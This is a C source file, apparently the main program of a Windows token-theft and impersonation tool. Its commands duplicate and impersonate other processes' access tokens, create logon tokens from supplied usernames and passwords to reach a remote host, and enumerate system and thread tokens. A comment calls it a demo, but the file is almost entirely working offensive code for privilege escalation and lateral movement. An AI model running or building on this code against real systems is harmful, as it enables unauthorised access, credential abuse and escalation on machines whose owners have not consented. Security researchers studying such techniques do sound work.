#include <Windows.h>
#include <stdio.h>
#include "enableSe.h"
#include "remoteSystem.h"
#include "steal_token.h"
#include "make_token.h"
#include "enumerate_token.h"

int wmain(int argc, wchar_t* argv[])
{

	if (argc < 2)
	{
		wprintf(L"Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	// command line args - very basic and error prone, just for demo purposes
	WCHAR* command = argv[1];
	WCHAR* subcommand = NULL;
	DWORD pid = NULL;
	WCHAR* targetHost = NULL;
	WCHAR* username = NULL;
	WCHAR* domain = NULL;
	WCHAR* password = NULL;




	if(wcscmp(command, L"duplicate") == 0) {
		if (argv[2] == NULL) {
			wprintf(L"[!] No PID specified...\n");
			return 1;
		}

		pid = _wtoi(argv[2]);
	}
	else if (wcscmp(command, L"impersonate") == 0) {
		if (argv[2] == NULL) {
			wprintf(L"[!] No PID specified...\n");
			return 1;
		}

		pid = _wtoi(argv[2]);
		targetHost = argv[3];
	}
	else if (wcscmp(command, L"make_token") == 0) {
		username = argv[2];
		domain = argv[3];
		password = argv[4];
		targetHost = argv[5];
	}
	else if (wcscmp(command, L"enumerate") == 0) {
		if (argv[3] == NULL) {
			wprintf(L"[!] No PID specified...\n");
			return 1;
		}
		
		subcommand = argv[2];
		pid = _wtoi(argv[3]);
	}
	else if (wcscmp(command, L"system") == 0) {
		// no args
	}
	else if (wcscmp(command, L"thread_tokens") == 0) {
		pid = _wtoi(argv[2]);
	}
	else {
		wprintf(L"Invalid command\n");
		return 1;
	}
	
	//enableSe();

	// Store token handle for later user
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;

	if (wcscmp(command, L"duplicate") == 0)
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

		if (hProcess == NULL)
		{
			wprintf(L"OpenProcess failed: %u\n", GetLastError());
			return 1;
		}

		duplicate(hProcess, hToken, pid);
		wprintf(L"hToken is: 0x%p\n", hToken);
	}
	else if (wcscmp(command, L"impersonate") == 0)
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

		if (hProcess == NULL)
		{
			wprintf(L"OpenProcess failed: %u\n", GetLastError());
			return 1;
		}

		impersonate(hProcess, hToken, pid, targetHost);
	}
	else if (wcscmp(command, L"make_token") == 0)
	{
		// Call LogonUserW to create a token with provided credentials
		wprintf(L"[+] Creating token for %ws\n", username);
		makeToken(username, domain, password, hToken);

		// Impersonate newly created token
		if (!ImpersonateLoggedOnUser(hToken))
		{
			wprintf(L"ImpersonateLoggedOnUser failed: %u\n", GetLastError());
			return 1;
		}
		else {
			wprintf(L"[+] Impersonated token for user %ws\n", username);
		}

		wprintf(L"[+] Attempting to drive on %ws\n", targetHost);
		listSystem(targetHost);

		// Revert to self
		if (!RevertToSelf()) {
			wprintf(L"RevertToSelf failed: %u\n", GetLastError());
		}
		else {
			wprintf(L"[+] Reverted to self\n");
		}
	}
	else if (wcscmp(command, L"enumerate") == 0) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

		if (hProcess == NULL)
		{
			wprintf(L"OpenProcess failed: %u\n", GetLastError());
			return 1;
		}

		if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken)) {
			wprintf(L"OpenProcessToken failed: %u\n", GetLastError());
		}

		// Parse subcommand and excute accordingly
		if (wcscmp(subcommand, L"sessionid") == 0) {
			DWORD sessionId = enumerateTokenSessionID(hToken);
			wprintf(L"[+] Process ID: %d\n", pid);
			wprintf(L"    [+] Token Session ID: %d\n", sessionId);
		}
		else if (wcscmp(subcommand, L"groups") == 0) {
			enumerateTokenGroups(hToken);
		}
		else if (wcscmp(subcommand, L"user") == 0) {
			enumerateTokenUser(hToken);
		}
		else if (wcscmp(subcommand, L"integrity") == 0) {
			enumerateTokenIntegrity(hToken);
		}
		else {
			wprintf(L"Invalid subcommand\n");
			return 1;
		}
	}
	else if (wcscmp(command, L"system") == 0) {
		enumerateSystemTokens();
	}
	else if (wcscmp(command, L"thread_tokens") == 0) {
		enumerateThreadToken(pid);
	}

	else {
		wprintf(L"Invalid command\n");
		return 1;
	}

	CloseHandle(hToken);
	CloseHandle(hProcess);

	return 0;
}